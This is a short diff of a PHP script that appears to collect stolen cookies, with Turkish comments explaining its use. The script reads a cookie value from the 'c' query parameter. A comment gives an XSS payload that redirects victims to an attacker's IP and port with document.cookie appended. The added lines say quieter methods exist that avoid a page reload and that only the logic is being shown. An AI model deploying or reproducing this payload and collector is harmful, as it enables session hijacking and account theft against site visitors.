@@ -1,7 +1,10 @@
 <?php
         $cookie = $_GET["c"];
         /*
-
+	
+	BU YÖNTEME GÖRE SAYFAYI RELOAD ETMEDEN YAPILABİLECEK DAHA SESSİZ YÖNTEMLER VARDIR.
+	SADECE OLAYIN MANTIĞI ANLATILMIŞTIR!
+	
         xss açığı bulunan bir siteye aşağıdaki javascript kodunu yedirdiğimizi düşünelim
 	#document.location = "http://ip_adresi:port/php_dosya_adi.php?c="+document.cookie
 
